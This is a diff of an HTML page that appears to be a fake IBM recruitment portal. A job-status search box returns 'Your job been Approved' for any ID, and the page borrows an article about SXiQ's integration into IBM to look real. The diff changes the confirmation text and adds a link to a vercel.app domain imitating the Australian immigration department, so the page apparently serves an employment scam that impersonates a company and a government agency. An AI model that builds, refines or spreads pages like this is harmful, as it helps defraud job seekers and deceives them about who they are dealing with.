@@ -11,15 +11,15 @@
   :root{ --nav:#002f6c; --accent:#0e6fb3; --ok:#16a34a; --danger:#c62828; }
   body{margin:0;background:#eef2f7;font-family:Arial;color:#111;}
   header{ background:var(--nav);color:#fff;padding:18px; text-align:center;font-size:18px;font-weight:bold; }
-  .wrap{max-width:600px;margin:20px auto;padding:12px;}
+  .wrap{max-width:100%;margin:20px auto;padding:12px;}
   .card{background:#fff;padding:18px;border-radius:12px; box-shadow:0 5px 20px rgba(0,0,0,0.07);margin-top:18px;}
-  input{width:100%;padding:12px;margin-top:6px;border-radius:8px; border:1px solid #cfd6df;font-size:16px;box-sizing:border-box;}
+  input{width:100%;padding:12px;margin-top:6px;border-radius:8px; border:1px solid #00A36C;font-size:16px;box-sizing:border-box;}
   .btn{width:100%;padding:14px;background:var(--accent);color:#fff; border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px;}
   
   .row{margin:12px 0;font-size:15px;border-bottom:1px solid #f0f0f0;padding-bottom:5px;display:flex;justify-content:space-between;}
   .k{font-weight:bold;color:#002b52;}
   .msg-box{ background:#e7f3ff;border-left:5px solid #0e6fb3; padding:15px;border-radius:8px;margin-top:14px;font-size:14px;line-height:1.5; color:#1a3a5a;}
-  .tick{color:#16a34a;font-size:18px;font-weight:bold;margin-top:15px;text-align:center;}
+  .tick{color:#16a34a;font-size:13px;font-weight:bold;margin-top:15px;text-align:center;}
 
   #popup {
     display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
@@ -54,21 +54,23 @@
 
 
 <div class="wrap">
-  <div class="card">
+   <a href="#" target="_blank" style="display:block;">
+  <img src="https://uploads.onecompiler.io/44ncz8e5z/44nqa6jps/14043.jpg"  alt="aud" 
+       style="width:100%; height:auto;"></a>
     <h3>• Check Your Job Status</h3>
    <p>To check the job, you need to type the jobs ID Number,</p>
-    <input id="jobIdInput" placeholder="Enter Jobs ID Type....">
-    <button class="btn" onclick="doSearch()">Search Status</button>
+    <input id="jobIdInput" placeholder="Enter/jobs/id/type....">
+    <button class="btn" onclick="doSearch()">Search jobs Status...</button>
   </div>
 
   <div id="resultBox" class="card" style="display:none;">
-    <div class="tick">✔  Thank you. Your job been  Submitted </div>
     <div class="row"><span class="k">Employer Name:</span> <span id="r_emp"></span></div>
     <div class="row"><span class="k">Jobs ID No:</span> <span id="r_id"></span></div>
     <div class="row"><span class="k">Jobs Post:</span> <span id="r_post"></span></div>
     <div class="row"><span class="k">Salary:</span> <span id="r_salary"></span></div>
     <div class="row"><span class="k">Job Time:</span> <span id="r_time"></span></div>
     <div class="row"><span class="k">Address:</span> <span id="r_addr"></span></div>
+    <div class="tick">✔  Thank you. Your job been Approved</div>
     <div id="confirmMsg" class="msg-box"></div>
     <img src="https://uploads.onecompiler.io/44m2zj4qk/44m9a6txx/12992.png" alt="Banner" width="100%">
   </div>
@@ -125,13 +127,14 @@ function showPopup(msg) {
 </script>
  </div>
  
+  <div class="card">
  <img src="https://uploads.onecompiler.io/44m2zj4qk/44m983nb9/12983.png" alt="Banner" width="100%">
- <div class="card">
  <h4>A Recruitment:</h4> <p> Notification From IBM Consulting, Which is Recruiting People for Various Business and Technical Transformation Positions.</p>
  <h3>Recruitment:</h3> <p> IBM Group Ltd is hiring for a number of positions within their organization. </p>
  <h3>Opportunities:</h3> <p> Competitive salary, global experience, and professional development opportunities. </p>
  <h3>Culture:</h3> <p> Offering an inclusive environment and comprehensive benefits including health and life insurance.</p>
 </div>
+
 <img src="https://uploads.onecompiler.io/44m2zj4qk/44ma7npp8/13006.webp" alt="Banner" width="100%">
 <img src="https://uploads.onecompiler.io/44m2zj4qk/44m99m8mu/12985.jpg" alt="Banner" width="100%">
  <img src="https://uploads.onecompiler.io/44m2zj4qk/44m9avsu5/12994.jpg" alt="Banner" width="100%">
@@ -146,12 +149,26 @@ function showPopup(msg) {
     <p>According to SXiQ “some things won’t change at all” such as its plans to deliver application and infrastructure transformation in the cloud, cost optimisation of the cloud and DevOps engineering enablement of cloud ops teams.</p>
     <p>It also said it would continue to provide its customers access to IBM’s capabilities, such as enterprise resource planning (ERP) systems, data and analytics, machine learning and artificial intelligence (AI).</p>
     <p>Both SXiQ and IBM have been contacted for comment.</p>
-   <a href="https://share.google/dJqoqAszqGZPKC2hN">Our Services.</a>
     </div>
     
      <div class="card">
+     <img src="https://uploads.onecompiler.io/44ncz8e5z/44nqa6jps/14064.gif" width="100%" height="100%">
+   </div>
+   
+    <a href="https://aus-immi-gov-au-citizenship-employe.vercel.app/" target="_blank" style="display:block;">
+  <img src="https://uploads.onecompiler.io/44ncz8e5z/44nqa6jps/14066.png"  alt="aud" 
+       style="width:100%; height:auto;"></a>
+     </div>
+     
+     <div class="card">
+     <img src="https://uploads.onecompiler.io/44ncz8e5z/44nqa6jps/14046.jpg" width="100%" height="100%">
+     <h3>Our Steps Here’s a look of what you can expect every step of the way.</h3>
+    <h3>Application</h3> <p>When you find a position you like, the first step is to fill out the online application form. If you are ever unsure about the status of your application, you can check it on the candidate portal.</p>
+   </div>
+        
+     <div class="card">
       <h3>SXiQ integrates into IBM’s Hybrid Cloud Services division</h3>
-    <img src="https://uploads.onecompiler.io/44meq4pvd/44mf2nvxa/13239.jpg" width="100%" height="100%">
+      <img src="https://uploads.onecompiler.io/44meq4pvd/44mf2nvxa/13239.jpg" width="100%" height="100%">
       <p>Melbourne-based digital transformation services company SXiQ has fully integrated into parent company IBM after seven years in business.</p>
       <p>Announcing the move in a LinkedIn post, SXiQ said it had worked with IBM, which acquired the company back in late 2021, over the last few months to bring both businesses together.</p>
       <p>SXiQ was formed in 2016 following the acquisition of Southern Cross Computer Systems (SCCS) by a private consortium led by managing director John Hanna and Matt McGuire. After this, the company rebranded to SXiQ.</p>
@@ -159,10 +176,10 @@ function showPopup(msg) {
       <p>At the time of SXiQ’s acquisition, the business’ brand and team were expected to be retained.</p>
       <p>We are excited to announce that we are now fully integrated into IBM’s Hybrid Cloud Services and instead of operating as two entities, we have brought the power of SXiQ and IBM together to help deliver faster, smarter, better cloud transformations for our customers,” the post read.</p>
       <p>After seven fun and highly successful years as SXiQ, we’re ready for a new adventure.</p>
-      <a href="https://share.google/dJqoqAszqGZPKC2hN">SSW Melbourne.</a>
    </div>
-      <div class="card">
-  <img src="https://uploads.onecompiler.io/44m2zj4qk/44mr8hd2c/13243.jpg" width="100%" height="100%">
+   
+  <div class="card">
+  <img src="https://uploads.onecompiler.io/44m2zj4qk/44mr8hd2c/13243.jpg" width="100%" height="99%">
     <div class="footer-grid">
     <div class="footer-col">
    <h3>About Business Unit</a>Bachelor's Degree</a>Required Education,</h3>
